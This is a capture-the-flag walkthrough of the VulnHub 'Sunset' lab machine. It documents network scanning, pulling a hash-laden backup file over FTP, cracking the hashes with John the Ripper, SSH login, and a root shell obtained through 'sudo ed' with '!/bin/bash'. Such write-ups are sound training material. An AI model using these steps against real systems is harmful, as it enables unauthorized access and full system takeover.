# Sunset

> A technical walkthrough of the **Sunset** machine from VulnHub, documenting the methodology used to obtain root access in a controlled lab environment.

---

## Overview

**Sunset** is an intentionally vulnerable Linux virtual machine from **VulnHub**. This write-up documents my approach to identifying the target, enumerating services, gaining initial access, and escalating privileges to obtain root access.

The goal of this report is to demonstrate a structured and methodical approach to solving a beginner-level Linux CTF.

---

## Machine Information

| Property         | Value              |
| ---------------- | ------------------ |
| Platform         | VulnHub            |
| Machine          | Sunset             |
| Operating System | Linux              |
| Difficulty       | Beginner           |
| Environment      | Oracle VirtualBox  |
| Objective        | Obtain Root Access |
| Status           | Completed-Success  |

---

## Lab Environment

**Attacker Machine**

* Kali Linux

**Target Machine**

* Sunset (VulnHub)

**Network**

* Bridged Adapter (VirtualBox)

---

## Tools Used

* arp-scan
* Nmap
* FTP
* John the Ripper
* OpenSSH
* GTFOBins

---

## Reconnaissance

The target machine was first identified using ARP scanning.

```bash
arp-scan --localnet
```

After identifying the target IP address, an Nmap scan was performed to identify open ports and running services.

```bash
nmap -APn -p- <TARGET-IP>
```

The scan revealed two services:

* FTP
* SSH

Since SSH required valid credentials, FTP became the primary focus for further enumeration.

---

## Enumeration

Connecting to the FTP service revealed a file named **backup**.

```bash
ftp <TARGET-IP>
```

The file was downloaded and inspected locally.

```bash
get backup
```

The backup contained several usernames along with password hashes, making it a valuable source for credential discovery.

---

## Credential Recovery

The password hash for the `sunset` user was extracted and analyzed using John the Ripper.

```bash
john decode.txt
```

Since the hash had already been cracked previously, the stored credentials were displayed using:

```bash
john --show decode.txt
```

The recovered credentials were then used for SSH authentication.

---

## Initial Access

Using the recovered credentials, I successfully authenticated to the SSH service.

```bash
ssh sunset@<TARGET-IP>
```

The shell was obtained as a low-privileged user.

Attempting to access the root directory confirmed that privilege escalation was required.

---

## Privilege Escalation

Running the following command revealed the user's sudo permissions:

```bash
sudo -l
```

The output showed that the `ed` editor could be executed as root without a password.

Using the GTFOBins technique:

```bash
sudo ed
```

Inside `ed`:

```text
!/bin/bash
```

This spawned a root shell.

Verification:

```bash
whoami
```

Output:

```text
root
```

---

## Lessons Learned

* Perform thorough enumeration before attempting exploitation.
* Backup files can expose valuable credentials.
* Password hashes may be recoverable with John the Ripper.
* Always inspect sudo permissions during privilege escalation.
* GTFOBins is a valuable resource for Linux privilege escalation techniques.

---

## References

* Platform: VulnHub
* Machine: Sunset
* Author: whitecr0wz
* Privilege Escalation Reference: GTFOBins

---

## Disclaimer

This assessment was performed in a controlled lab environment using an intentionally vulnerable virtual machine. The information provided is intended solely for educational purposes.
